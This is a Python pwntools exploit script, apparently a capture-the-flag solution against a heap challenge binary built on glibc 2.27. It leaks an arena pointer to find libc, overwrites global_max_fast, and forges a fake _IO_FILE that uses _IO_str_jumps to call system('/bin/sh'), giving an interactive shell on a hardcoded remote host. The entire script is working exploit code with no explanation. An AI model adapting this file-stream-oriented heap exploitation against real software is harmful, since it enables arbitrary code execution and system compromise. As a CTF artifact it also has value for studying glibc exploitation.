from pwn import *

DEBUG = 1
elf_path = './pwn'
libc = ELF('./libc-2.27.so')
context.log_level=True

if DEBUG:
    p = process('./pwn')
else:
    p=remote("47.96.90.40",12345)

ru = lambda x : p.recvuntil(x)
sn = lambda x : p.send(x)
rl = lambda   : p.recvline()
sl = lambda x : p.sendline(x)
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)


def r6():
    return u64(rv(6).ljust(8,'\x00'))
    
if __name__ == '__main__':
    
    ru('Now you can get a big box, what size?')
    sl(str(0x1450-0x20))
    ru('Now you can get a bigger box, what size?')
    sl('20480')
    ru('Do you want to rename?(y/n)')
    sl('y')
    ru('Now your name is:')
    arena_base = u64(rv(6) + '\x00\x00')
    print hex(arena_base)
    sn(p64(0)+p64(arena_base-(0x7fae0cfe0ca0 - 0x7fae0cfe2940) - 0x10))#gmf
    libc_base = arena_base - (0x7faf7ffb0ca0 - 0x7faf7fbc5000)
    print hex(libc_base)
    target_addr = libc_base + libc.symbols['_IO_list_all']
    ru('Do you want to edit big box or bigger box?(1:big/2:bigger)')
    sl('1')
    ru('Let\'s edit,')
    binshsdd = 0x1b40fa + libc_base
    IO_str_jumps = libc_base + 0x7f5020add360 - 0x7f50206f5000
    fake_IO_FILE  = p64(0)*2
    fake_IO_FILE += p64(0) + p64(binshsdd+1)
    fake_IO_FILE += p64(0) + p64(0)
    fake_IO_FILE += p64((binshsdd-100)/2) + p64(0)
    fake_IO_FILE =  fake_IO_FILE.ljust(0xb0,'\x00')
    fake_IO_FILE += p64(0xFFFFFFFFFFFFFFFF) + p64(0)*2
    fake_IO_FILE += p64(IO_str_jumps)
    fake_IO_FILE += p64(libc_base+libc.symbols['system'])
    # li()
    sl(fake_IO_FILE)
    ru('bye')
    gdb.attach(p)
    raw_input()
    p.interactive()
    # print len(fake_IO_FILE)
    

    
    
    

